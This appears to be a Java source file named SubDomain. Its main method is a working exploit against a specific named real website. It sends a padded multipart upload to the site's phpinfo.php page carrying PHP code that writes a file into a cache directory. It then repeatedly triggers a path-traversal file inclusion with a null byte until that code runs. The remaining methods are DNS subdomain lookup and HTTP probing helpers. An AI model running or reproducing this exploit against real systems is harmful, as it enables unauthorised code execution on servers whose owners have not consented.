package com.cdzmqm;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.nio.Buffer;
import java.util.HashMap;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.xbill.DNS.*;

public class SubDomain{
	public static void main(String[] args) throws Exception 
	{	
		String padding = "";String phptmp;String url;String tmp;
		for(int i=0;i<8000;i++)
		{
			padding = padding + "A";
		}
		InetAddress host = InetAddress.getByName("price.ziroom.com");
		int port = 80;
		StringBuffer sb = new StringBuffer();
		StringBuffer sb2 = new StringBuffer();
		sb2.append("-----------------------------7dbff1ded0714\r\n");
		sb2.append("Content-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\r\n");
		sb2.append("Content-Type: text/plain\r\n");
		sb2.append("\r\n");
		sb2.append("justajoke<?php file_put_contents('./cache/wy.php','phpinfo();')?>");
		sb2.append("\r\n");
		sb2.append("-----------------------------7dbff1ded0714");
		sb.append("POST /phpinfo.php?a="+padding+" HTTP/1.1\r\n");
		sb.append("Cookie: PHPSESSID=q249llvfromc1or39t6tvnun52; othercookie="+padding+"\r\n");
		sb.append("Accept: "+padding+"\r\n");
		sb.append("User-agent: "+padding+"\r\n");
		sb.append("Accept-Language: "+padding+"\r\n");
		sb.append("Pragma: "+padding+"\r\n");
		sb.append("Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r\n");
		sb.append("Content-Length: "+String.valueOf(sb2.length())+"\r\n");
		sb.append("Host: price.ziroom.com\r\n\r\n");
		sb.append(sb2);
		String sbs = sb.toString();
		//System.out.println(sb.toString());	
		Socket socket;
		while(true)
		{
			socket = new Socket(host,port);
			PrintWriter out = new PrintWriter(socket.getOutputStream());
			out.write(sbs);
			out.flush();
			String data="";
			while(data.indexOf("</body></html>")<0)
			{
				data = SubDomain.getData(socket.getInputStream());
				phptmp = SubDomain.getPhptmp(data);
				if(phptmp!=null)
				{
					url = "http://price.ziroom.com/?_p=../../../../../../../.."+phptmp+"%00.html";
					tmp = Request.doGet(url);
					System.out.println(url);
					if(tmp.indexOf("justajoke")>-1)
					{
						System.exit(0);
					}
				}
			}
		}
	}
	public static String getData(InputStream in) throws Exception
	{
		String data="";String tmp;
		BufferedReader br = new BufferedReader(new InputStreamReader(in));
		while((tmp=br.readLine())!=null)
		{
			data += tmp;
		}
//		Scanner scanner = new Scanner(in);	
//		while(scanner.hasNextLine()) {
//			data += scanner.nextLine()+"\r\n";
//		}
		return data;
	}
	public static String getPhptmp(String data)
	{
		String tmp = null;
		Matcher m = Pattern.compile("\\[tmp_name] =&gt;\\s(.*?)\\s").matcher(data);
		if(m.find())
		{
			tmp = m.group(1);
		}
		return tmp;
	}
	public static String getDomain(String url,int type) throws Exception
	{
		Lookup lookup = new Lookup(url,type);
		String data = "";
		lookup.run();
		if (lookup.getResult() != Lookup.SUCCESSFUL){
			data = "ERROR: " + lookup.getErrorString();
		    return data;
		}
		Record[] answers = lookup.getAnswers();
		for(Record rec : answers){
		    data += rec.toString()+"\r\n";
		}
		return data;
	}
	public static HashMap<String, String> getDomain(String url) throws Exception
	{
		HashMap<String,String> domain = new HashMap<>();
		domain.put("NS",SubDomain.getDomain(url,Type.NS));
		domain.put("MX",SubDomain.getDomain(url,Type.MX));
		domain.put("A",SubDomain.getDomain(url,Type.A));
		return domain;
	}
	public static String getInfo(String tmp,String Domain,int option)
	{
		String Ip = "";
		String Code = null;
		String Server = null;
		boolean Iscdn = false;
		if (!tmp.matches("ERROR.+"))
		{
			Pattern p = Pattern.compile("(?<domain>[a-z-\\d.]+)\\..+\\s(?<ip>[\\d.]+)");
			Matcher m = p.matcher(tmp);		
			while(m.find())
			{
				Ip += m.group("ip")+',';
				if(!Domain.equalsIgnoreCase(m.group("domain"))) {
					Iscdn = true;
				}
			}
			Ip = Ip.substring(0,Ip.length()-1);
			if(option==3)
			{
				Code = Request.getResponse("http://"+Domain,"Code");
				Server = Request.getResponse("http://"+Domain,"Server");
			}else if(option==1)
			{
				Code = Request.getResponse("http://"+Domain,"Code");
			}else if(option==2)
			{
				Code = Request.getResponse("http://"+Domain,"Server");
			} 
			return Domain+"--"+Ip+"--"+Iscdn+"--"+Code+"--"+Server;//多线程中想要使用数据必须在类或者实例的成员函数里申明后使用。如果作为类或者实例的成员变量申明后使用，返回的数据全是一样的。
		} else 
		{
			return null;
		}
		
	}
}

class SubDomainThread implements Runnable {
	private int i = 200;

	public void run() {
		try {
			for(;i>=0;)
			{
				i--;
				if(i>=0){

					
				}
			}
		} catch (Exception e) {
			// TODO: handle exception
			//e.printStackTrace();
		}
	}
	
}
